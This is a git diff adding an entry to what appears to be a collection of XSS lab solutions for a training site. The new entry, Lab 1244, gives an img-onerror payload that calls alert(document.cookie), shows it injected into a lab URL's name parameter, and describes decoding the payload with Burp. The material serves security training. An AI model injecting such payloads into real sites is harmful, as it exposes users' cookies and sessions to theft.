@@ -571,6 +571,21 @@ https://dl5kmrls.hacky.uk/target.ftl?name=%3Cimg%20src%3Dx%20onerror=alert%28doc
 
 ---
 
+### Lab 1244: Unencoded
+- **URL Lab**: https://hacky.uk/lab/1244
+- **Payload**: 
+```
+<img src=x onerror=alert(document.cookie) 
+```
+- **Full URL**: 
+```
+https://3xotwvsz.hacky.uk/target.ftl?name=<img src=x onerror=alert(document.cookie)
+```
+- **Description**: Intercept request using burp, and then decode the encoded payload
+From <img+src%3Dx+onerror%3Dalert%28document.cookie%29> To <img src=x onerror=alert(document.cookie) 
+
+---
+
 ## Adept Level
 
 ### Lab 5: Unicode XSS [Using Full-width Character]
